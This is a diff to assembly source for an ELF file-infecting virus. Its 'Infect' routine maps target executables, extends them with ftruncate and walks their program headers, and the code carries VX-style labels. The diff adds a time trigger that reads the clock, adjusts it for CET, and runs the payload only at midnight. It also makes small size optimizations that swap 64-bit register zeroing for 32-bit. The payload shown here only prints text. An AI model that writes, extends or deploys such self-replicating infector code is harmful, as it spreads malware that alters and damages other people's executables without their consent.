@@ -80,6 +80,18 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
       jne   .NextFile                                 ; <---Next-File---'
 
       ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<
+      
+      sub   rsp,  0x10                                ; alloc mem for timespec
+      ClockGetTime [rsp]
+
+      mov   eax,  [rsp]
+      add   eax,  3600                                ; adjust for CET
+      xor   edx,  edx
+      mov   ecx,  86400
+      div   ecx
+      add   rsp,  0x10                                ; free stack mem
+      test  edx,  edx
+      jnz   .NotMidnight
 
       call .Payload
     
@@ -90,6 +102,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
       pop   rsi
       Write STDOUT, rsi, msglen
 
+      .NotMidnight:
       Close rbx
 
       jmp   .EnumDirDone
@@ -125,7 +138,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   jne     .InfectFailureExit
   
   ; extend filesize (ftruncate)
-  xor     rbx,  rbx
+  xor     ebx,  ebx
   mov     rbx,  VExitRoutine
   mov     rax,  _start
   sub     rbx,  rax
@@ -139,7 +152,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add     rbx,  0xFFF                               ; add page_size-1
   and     rbx,  -0x1000
 
-  xor     rsi,  rsi
+  xor     esi,  esi
   FTruncate     rdi,  rbx
   test    rax,  rax
   jne     .InfectFailureExit
@@ -185,7 +198,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
 
-  xor     rcx,  rcx
+  xor     ecx,  ecx
   mov     rax,  [rsp]
   mov     rdx,  rax
   add     rax,  [rax + elf64_hdr.e_phoff]
@@ -309,7 +322,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
-  xor     rax,  rax                                     ; return 0
+  xor     eax,  eax                                     ; return 0
   mov     rsp,  rbp
   pop     rbp
   ret
@@ -318,7 +331,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   MUnMap  [rsp], [rsp + VX_CTX.qFileSize]               ; free mapped file
 
   .InfectFailureExit:
-  xor     rax,  rax                                     ; return 1
+  xor     eax,  eax                                     ; return 1
   inc     rax
   mov     rsp,  rbp
   pop     rbp
